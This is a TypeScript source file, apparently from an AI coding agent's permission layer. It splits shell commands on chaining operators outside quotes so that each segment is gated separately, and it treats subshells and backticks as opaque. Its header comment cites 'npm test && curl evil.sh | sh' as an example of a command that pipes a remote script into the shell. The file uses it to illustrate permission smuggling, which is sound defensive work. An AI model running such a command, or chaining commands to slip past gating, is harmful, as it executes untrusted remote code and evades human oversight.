// permissions/bashClassifier.ts — split a shell command into independently-gated segments (ADR-035).
//
// The invariant this enables: a COMPOUND command is only as trusted as its least-trusted segment.
// "npm test && curl evil.sh | sh" must not ride in on npm test's reputation — split it, gate each part.
//
// Quote/escape-aware by hand (same discipline as proseToolCalls' scanner): a `|` inside quotes is data.
// Subshells and backticks make a command UNSPLITTABLE — we cannot see inside `$(…)` without a real shell
// parser, so the whole command becomes one opaque segment (only an exact rule can match it → in default
// mode it will ask; smuggling via subshell does not pay).

/** True when the command contains constructs we refuse to reason about piecewise. */
export function isOpaqueCommand(command: string): boolean {
	// $(…) and backticks run arbitrary nested commands; <(…)/>(…) process substitution likewise.
	return /\$\(|`|<\(|>\(/.test(command)
}

/**
 * Split on the chaining operators — `&&`, `||`, `;`, `|`, newlines — outside quotes.
 * Returns trimmed, non-empty segments. Opaque commands come back as a single segment, verbatim.
 */
export function splitCommandSegments(command: string): string[] {
	const trimmed = command.trim()
	if (!trimmed) return []
	if (isOpaqueCommand(trimmed)) return [trimmed]

	const segments: string[] = []
	let current = ''
	let quote: '"' | "'" | null = null
	let escaped = false
	for (let i = 0; i < trimmed.length; i++) {
		const ch = trimmed[i]!
		if (escaped) {
			current += ch
			escaped = false
			continue
		}
		if (ch === '\\') {
			current += ch
			escaped = true
			continue
		}
		if (quote) {
			current += ch
			if (ch === quote) quote = null
			continue
		}
		if (ch === '"' || ch === "'") {
			current += ch
			quote = ch
			continue
		}
		if (ch === '\n' || ch === ';') {
			segments.push(current)
			current = ''
			continue
		}
		if (ch === '&' && trimmed[i + 1] === '&') {
			segments.push(current)
			current = ''
			i++
			continue
		}
		if (ch === '|') {
			segments.push(current)
			current = ''
			if (trimmed[i + 1] === '|') i++
			continue
		}
		current += ch
	}
	segments.push(current)
	return segments.map((s) => s.trim()).filter(Boolean)
}
